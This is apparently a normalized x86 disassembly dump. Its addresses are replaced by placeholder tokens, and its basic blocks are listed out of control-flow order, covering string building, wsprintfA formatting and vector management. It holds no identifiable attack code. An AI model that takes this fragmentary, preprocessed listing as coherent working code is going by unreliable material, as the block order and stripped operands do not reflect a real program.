sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2b0 ] 0xd
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
lea ebx [ ebx ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x294 ] 0x1
call sub_4a4680
cmp [ ebp + 0x344 ] edi
jb r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x2c ] esp
push eax
call sub_4024d0
lea ecx [ esp + 0x34 ]
call sub_4a3ca0
lea ecx [ esp + 0x18 ]
mov [ esp + 0x294 ] 0x1
call sub_4a4680
mov eax [ esp + 0x29c ]
xor ebp ebp
add eax 0x1a8
mov [ esp + 0x14 ] eax
jmp r-xdata
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x34 ]
call sub_4a3f10
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2b0 ] 0x16
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2cc ] 0xe
mov [ esp + 0x6c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
lea esp [ esp ]
lea eax [ ebp + 0x330 ]
mov eax [ ebp + 0x330 ]
jmp r-xdata
mov ecx [ esp + 0x14 ]
cmp [ ecx + 0x10 ] ebx
je r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x54 ]
call sub_4a3f10
cmp [ ebp + 0x248 ] edi
mov [ esp + 0x294 ] 0x1f
jb r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2cc ] 0x17
mov [ esp + 0x6c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x70 ]
mov [ esp + 0x2cc ] 0xd
call sub_4a4080
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
cmp eax 0x1
jne r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x2c ] esp
push r--data
jmp r-xdata
push eax
call j_sub_4b692d
add esp 0x4
cmp eax ebx
jne r-xdata
mov ecx [ esp + 0x14 ]
inc ebp
add ecx 0x1c
cmp ebp 0x3
mov [ esp + 0x14 ] ecx
jl r-xdata
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
jmp r-xdata
add ebp 0x234
mov [ esp + 0x14 ] ebp
mov ecx [ ebp + 0x234 ]
mov [ esp + 0x14 ] ecx
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x50 ]
mov [ esp + 0x2cc ] 0x16
call sub_4a4080
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x34 ]
call sub_4a3f10
cmp [ ebp + 0x2f0 ] 0x10
mov [ esp + 0x294 ] 0xf
jb r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x2c ] esp
push r--data
call sub_4024d0
lea ecx [ esp + 0x34 ]
call sub_4a3ca0
mov eax [ esp + 0x29c ]
cmp [ eax + 0x35c ] ebx
je r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edx [ esp + 0x14 ]
push edx
call sub_4a47a0
add esp 0x4
lea ecx [ esp + 0x38 ]
mov [ esp + 0x294 ] 0x1
call sub_4a4680
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x54 ]
call sub_4a3f10
cmp [ ebp + 0x130 ] 0x10
mov [ esp + 0x294 ] 0x18
jb r-xdata
lea eax [ ebp + 0x2dc ]
mov eax [ ebp + 0x2dc ]
jmp r-xdata
lea ecx [ esp + 0x70 ]
mov [ esp + 0x294 ] bl
call sub_4a4680
mov eax r--data
mov [ esp + 0x294 ] 0xffffffff
lea edx [ eax + 0x1 ]
sub esp 0x1c
mov esi esp
mov ebp 0xf
mov eax r--data
mov [ esi + 0x18 ] ebp
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edx [ eax + 0x1 ]
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x54 ]
call sub_4a3f10
lea edx [ ebp + 0x1 ]
push edx
lea eax [ esp + 0x90 ]
push r--data
push eax
mov [ esp + 0x2a0 ] 0x20
call [ wsprintfA@IAT ]
sub esp 0x10
mov esi esp
lea eax [ esp + 0xa8 ]
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
mov edi edi
lea eax [ ebp + 0x11c ]
mov eax [ ebp + 0x11c ]
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x70 ]
call sub_4a3f10
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2b0 ] 0x10
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
sub esp 0x1c
mov ecx esp
mov [ esp + 0x2c ] esp
push eax
call sub_4024d0
lea ecx [ esp + 0x34 ]
call sub_4a3ca0
lea ecx [ esp + 0x18 ]
mov [ esp + 0x294 ] 0xd
call sub_4a4680
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx rw-data
call sub_401e80
mov edi [ esp + 0x2a0 ]
mov eax [ edi + 0x14 ]
push eax
lea ecx [ esp + 0x190 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov eax r--data
add esp 0xc
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x54 ]
call sub_4a3f10
mov esi [ esp + 0x29c ]
mov eax [ esi + 0x360 ]
mov edi 0x10
cmp eax edi
mov [ esp + 0x294 ] 0x23
jb r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
lea ecx [ esp + 0xac ]
push ecx
mov ecx esi
call sub_401e80
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2cc ] 0x21
mov [ esp + 0x6c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x70 ]
call sub_4a3f10
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2b0 ] 0x19
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
lea ebx [ ebx ]
sub esp 0x1c
mov ecx esp
mov [ esp + 0x2c ] esp
push eax
call sub_4024d0
lea ecx [ esp + 0x54 ]
call sub_4a3ca0
lea ecx [ esp + 0x38 ]
mov [ esp + 0x294 ] 0x16
call sub_4a4680
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2cc ] 0x11
mov [ esp + 0x6c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
push eax
push r--data
mov ecx edi
call sub_401cc0
lea eax [ esp + 0x18c ]
lea edx [ eax + 0x1 ]
add esi 0x34c
mov esi [ esi + 0x34c ]
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x70 ]
mov [ esp + 0x2cc ] 0x20
call sub_4a4080
mov edx [ esp + 0x14 ]
cmp [ edx + 0x14 ] 0x10
jb r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2cc ] 0x1a
mov [ esp + 0x6c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x8c ]
mov [ esp + 0x2cc ] 0x10
call sub_4a4080
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x190 ]
push edx
mov ecx edi
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ esp + 0x20 ]
call sub_401e80
push 0xffffffff
push ebx
lea ecx [ esp + 0x20 ]
push ecx
mov ecx [ rw-data ]
mov [ esp + 0x2a0 ] 0x24
call sub_4018c0
cmp [ esp + 0x30 ] edi
jb r-xdata
mov eax esi
mov [ esp + 0x30 ] ebp
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
lea edx [ eax + 0x1 ]
mov esi [ esp + 0x14 ]
mov eax edx
mov esi [ eax ]
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x8c ]
mov [ esp + 0x2cc ] 0x19
call sub_4a4080
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x34 ]
call sub_4a3f10
cmp [ ebp + 0x308 ] ebx
mov [ esp + 0x294 ] 0x12
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx edi
call sub_401cc0
mov eax 0x1
lea ecx [ esp + 0x38 ]
mov [ esp + 0x30 ] ebp
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
mov [ esp + 0x294 ] 0x1
call sub_4a4680
mov edx [ esp + 0x1c ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ esp + 0x20 ]
call sub_401e80
push 0xffffffff
push ebx
lea ecx [ esp + 0x20 ]
push ecx
mov ecx [ rw-data ]
mov [ esp + 0x2a0 ] 0x22
call sub_4018c0
cmp [ esp + 0x30 ] 0x10
jb r-xdata
mov edi 0xf
mov eax esi
mov [ esp + 0x30 ] edi
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x54 ]
call sub_4a3f10
cmp [ ebp + 0x148 ] ebx
mov [ esp + 0x294 ] 0x1b
jne r-xdata
cmp [ ebp + 0x30c ] 0x10
jb r-xdata
or esi 0xffffffff
jmp r-xdata
lea ecx [ esp + 0x38 ]
mov [ esp + 0x30 ] edi
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
mov [ esp + 0x294 ] 0x1
call sub_4a4680
mov edx [ esp + 0x1c ]
push edx
call j_sub_4b66ed#2
add esp 0x4
cmp [ ebp + 0x14c ] 0x10
jb r-xdata
or esi 0xffffffff
jmp r-xdata
lea eax [ ebp + 0x2f8 ]
mov eax [ ebp + 0x2f8 ]
jmp r-xdata
cmp [ ebp + 0x324 ] ebx
jne r-xdata
lea eax [ ebp + 0x138 ]
mov eax [ ebp + 0x138 ]
jmp r-xdata
cmp [ ebp + 0x164 ] ebx
jne r-xdata
cmp [ ebp + 0x328 ] 0x10
jb r-xdata
or eax 0xffffffff
jmp r-xdata
push eax
call j_sub_4b692d
add esp 0x4
mov esi eax
cmp [ ebp + 0x168 ] 0x10
jb r-xdata
or eax 0xffffffff
jmp r-xdata
push eax
call j_sub_4b692d
add esp 0x4
mov esi eax
lea eax [ ebp + 0x314 ]
mov eax [ ebp + 0x314 ]
jmp r-xdata
sub esi eax
push esi
lea ecx [ esp + 0x1c ]
call sub_4a3d00
lea ecx [ esp + 0x18 ]
mov [ esp + 0x294 ] 0x10
call sub_4a4680
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
mov edi edi
lea eax [ ebp + 0x154 ]
mov eax [ ebp + 0x154 ]
jmp r-xdata
sub esi eax
push esi
lea ecx [ esp + 0x3c ]
call sub_4a3d00
lea ecx [ esp + 0x38 ]
mov [ esp + 0x294 ] 0x19
call sub_4a4680
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x34 ]
call sub_4a3f10
push ebx
lea ecx [ esp + 0x1c ]
mov [ esp + 0x298 ] 0x13
call sub_4a3d00
lea ecx [ esp + 0x18 ]
mov [ esp + 0x294 ] 0x10
call sub_4a4680
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
push eax
call j_sub_4b692d
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x54 ]
call sub_4a3f10
push ebx
lea ecx [ esp + 0x3c ]
mov [ esp + 0x298 ] 0x1c
call sub_4a3d00
lea ecx [ esp + 0x38 ]
mov [ esp + 0x294 ] 0x19
call sub_4a4680
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
push eax
call j_sub_4b692d
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x34 ]
call sub_4a3f10
cmp [ ebp + 0x308 ] ebx
mov [ esp + 0x294 ] 0x14
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x54 ]
call sub_4a3f10
cmp [ ebp + 0x148 ] ebx
mov [ esp + 0x294 ] 0x1d
jne r-xdata
cmp [ ebp + 0x30c ] 0x10
jb r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebp + 0x14c ] 0x10
jb r-xdata
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp + 0x2f8 ]
mov eax [ ebp + 0x2f8 ]
jmp r-xdata
push eax
lea ecx [ esp + 0x1c ]
call sub_4a3d00
lea ecx [ esp + 0x18 ]
mov [ esp + 0x294 ] 0x10
call sub_4a4680
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
lea ecx [ ecx ]
lea eax [ ebp + 0x138 ]
mov eax [ ebp + 0x138 ]
jmp r-xdata
push eax
lea ecx [ esp + 0x3c ]
call sub_4a3d00
lea ecx [ esp + 0x38 ]
mov [ esp + 0x294 ] 0x19
call sub_4a4680
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x34 ]
call sub_4a3f10
push ebx
lea ecx [ esp + 0x1c ]
mov [ esp + 0x298 ] 0x15
call sub_4a3d00
lea ecx [ esp + 0x18 ]
mov [ esp + 0x294 ] 0x10
call sub_4a4680
lea ecx [ esp + 0x54 ]
mov [ esp + 0x294 ] 0xd
call sub_4a4680
lea ecx [ esp + 0x38 ]
mov [ esp + 0x294 ] 0x1
call sub_4a4680
mov edi 0x10
push eax
call j_sub_4b692d
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x54 ]
call sub_4a3f10
push ebx
lea ecx [ esp + 0x3c ]
mov [ esp + 0x298 ] 0x1e
call sub_4a3d00
lea ecx [ esp + 0x38 ]
mov [ esp + 0x294 ] 0x19
call sub_4a4680
lea ecx [ esp + 0x54 ]
mov [ esp + 0x294 ] 0x16
call sub_4a4680
lea ecx [ esp + 0x18 ]
mov [ esp + 0x294 ] 0x1
call sub_4a4680
mov edi 0x10
push eax
call j_sub_4b692d
add esp 0x4
sub_4a6200
sub esp 0x8
push esi
mov esi ecx
mov eax [ esi + 0x10038 ]
test eax eax
jne r-xdata
mov edx [ esi + 0x10034 ]
mov eax [ esi + 0x10038 ]
lea ecx [ esi + 0x10028 ]
add eax edx
mov edx [ ecx + 0x8 ]
mov [ esp + 0x4 ] eax
dec eax
cmp edx eax
pop esi
ja r-xdata
push r--data
push esi
call sub_4a4220
add esp 0x8
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax * 4 ]
add eax 0x2c
add esp 0x8
retn
sub eax edx
sub_4a6250
sub esp 0x14
push ebx
push ebp
push esi
mov esi ecx
mov eax [ esi + 0x10038 ]
test eax eax
push edi
mov [ esp + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x10038 ]
mov ebx [ esi + 0x10034 ]
add esi 0x10028
add eax ebx
mov ecx esi
mov edx [ ecx + 0x8 ]
mov [ esp + 0x14 ] eax
dec eax
cmp edx eax
mov [ esp + 0x10 ] esi
ja r-xdata
push r--data
push esi
call sub_4a4220
add esp 0x8
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + eax * 4 ]
mov ebp [ esi + 0x10 ]
mov eax [ esi + 0xc ]
mov ebx [ edx + 0x20 ]
add ebp eax
mov [ esp + 0x14 ] ebp
sub eax edx
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + eax * 4 ]
cmp ebx [ edx + 0x24 ]
je r-xdata
sub eax edx
mov esi [ esp + 0x28 ]
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov edi [ esp + 0x2c ]
mov eax edi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx esi
call sub_401e80
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
add esp 0x14
retn 0x8
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov edx [ ebx + 0x14 ]
test edx edx
je r-xdata
cmp edx eax
jb r-xdata
cmp edx eax
mov ecx edx
jb r-xdata
add ebx 0x38
jmp r-xdata
xor ecx ecx
cmp edx eax
setne cl
mov ebp ecx
test ebp ebp
je r-xdata
cmp [ ebx + 0x18 ] 0x10
jb r-xdata
mov ecx eax
mov ecx esi
mov edx [ ecx + 0x8 ]
lea eax [ ebp - 0x1 ]
cmp edx eax
mov [ esp + 0x1c ] ebp
ja r-xdata
mov esi [ esp + 0x28 ]
push 0xffffffff
lea eax [ ebx + 0x1c ]
push 0x0
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
push eax
mov ecx esi
mov [ esi + 0x4 ] 0x0
call sub_401dd0
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
add esp 0x14
retn 0x8
mov esi [ esp + 0x10 ]
mov ebp [ esp + 0x14 ]
lea esi [ ebx + 0x4 ]
mov esi [ ebx + 0x4 ]
jmp r-xdata
test ebp ebp
jne r-xdata
sbb ebp ebp
sbb ebp 0xffffffff
xor ebp ebp
[ esi ] [ edi ]
je r-xdata
mov esi [ esp + 0x10 ]
mov ebp [ esp + 0x14 ]
sub_4a63c0
push esi
xor eax eax
push edi
mov edi [ esp + 0xc ]
cmp edi eax
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
jne r-xdata
cmp edi 0x4924924
jbe r-xdata
pop edi
xor al al
pop esi
retn 0x4
imul edi edi 0x38
push edi
call sub_4b573e
add edi eax
add esp 0x4
mov [ esi + 0xc ] edi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop edi
mov al 0x1
pop esi
retn 0x4
mov ecx esi
call sub_4a4460
sub_4a6420
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
pop edi
pop esi
retn 0x8
mov edi edi
mov ecx esi
call sub_401ae0
add esi 0x38
cmp esi edi
jne r-xdata
sub_4a6450
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov esi ecx
mov edx [ esi + 0x8 ]
mov eax 0x38e38e3
sub eax edx
cmp eax ebx
push edi
jae r-xdata
mov ecx [ esi + 0x8 ]
mov eax ecx
shr eax 0x1
cmp eax 0x8
jae r-xdata
call sub_4a44e0
cmp ebx eax
jae r-xdata
mov eax 0x8
mov edi [ esi + 0xc ]
lea eax [ ecx + ebx ]
shl eax 0x2
push eax
call sub_4b573e
mov edx [ esp + 0x18 ]
mov ecx [ esi + 0x8 ]
push edx
mov ebp eax
mov eax [ esi + 0x4 ]
push esi
lea edx [ ebp + edi * 4 ]
lea ecx [ eax + ecx * 4 ]
push edx
lea eax [ eax + edi * 4 ]
push ecx
push eax
call sub_453050
mov ecx [ esi + 0x4 ]
add esp 0x18
cmp edi ebx
ja r-xdata
mov edx 0x38e38e3
sub edx eax
cmp ecx edx
ja r-xdata
mov edx [ esp + 0x14 ]
push edx
push esi
push eax
lea eax [ ecx + ebx * 4 ]
push eax
push ecx
call sub_453050
mov eax [ esi + 0x4 ]
mov [ esp + 0x28 ] 0x0
mov edx [ esp + 0x28 ]
push edx
push esi
lea ecx [ eax + edi * 4 ]
push ebp
lea eax [ eax + ebx * 4 ]
push ecx
push eax
call sub_453050
mov ecx [ esp + 0x3c ]
push ecx
push esi
lea edx [ esp + 0x44 ]
push edx
push ebx
push eax
mov [ esp + 0x14 ] 0x0
mov edx [ esp + 0x14 ]
push edx
push esi
push eax
lea eax [ ecx + edi * 4 ]
push eax
push ecx
call sub_453050
mov ecx [ esp + 0x28 ]
push ecx
push esi
lea edx [ esp + 0x30 ]
push edx
mov ecx ebx
sub ecx edi
push ecx
push eax
call sub_420d80
mov [ esp + 0x3c ] 0x0
mov edx [ esp + 0x3c ]
push edx
push esi
lea eax [ esp + 0x44 ]
push eax
push edi
push ebp
jmp r-xdata
mov ebx eax
call sub_420d80
mov eax [ esi + 0x4 ]
add esp 0x3c
push eax
call j_sub_4b66ed#2
mov eax [ esi + 0x8 ]
add esp 0x4
add eax ebx
pop edi
mov [ esi + 0x4 ] ebp
mov [ esi + 0x8 ] eax
pop esi
pop ebp
pop ebx
retn 0x4
sub_4a6580
push ebp
mov ebp esp
push 0xffffffff
push sub_4c1ba1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0xc ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
dec edi
add esi 0x38
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x8 ] esi
jmp r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov ecx esi
call sub_4a3d50
cmp edi ebx
jbe r-xdata
sub_4a65da
mov edi [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp edi eax
je r-xdata
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea esi [ edi + 0x34 ]
lea esp [ esp ]
mov [ esi ] 0xf
mov [ esi - 0x4 ] ebx
mov [ esi - 0x14 ] bl
cmp [ esi - 0x1c ] 0x10
jb r-xdata
mov eax [ esi - 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ ebp + 0x8 ]
mov [ esi - 0x1c ] 0xf
mov [ esi - 0x20 ] ebx
mov [ esi - 0x30 ] bl
add edi 0x38
add esi 0x38
cmp edi eax
jne r-xdata
mov eax [ esi - 0x30 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esi ] 0x10
jb r-xdata
sub_4a6660
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
call sub_4a45a0
add esp 0x14
retn 0xc
sub_4a66a0
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_4a6580
mov eax esi
imul eax eax 0x38
add esp 0x14
add eax edi
pop edi
pop esi
retn 0xc
sub_4a66d0
push ebp
mov ebp esp
push 0xffffffff
push sub_4c1bb8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
push eax
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x14 ] esi
call sub_4a3d50
mov eax [ esi + 0x4 ]
xor edi edi
cmp eax edi
mov [ ebp - 0x4 ] edi
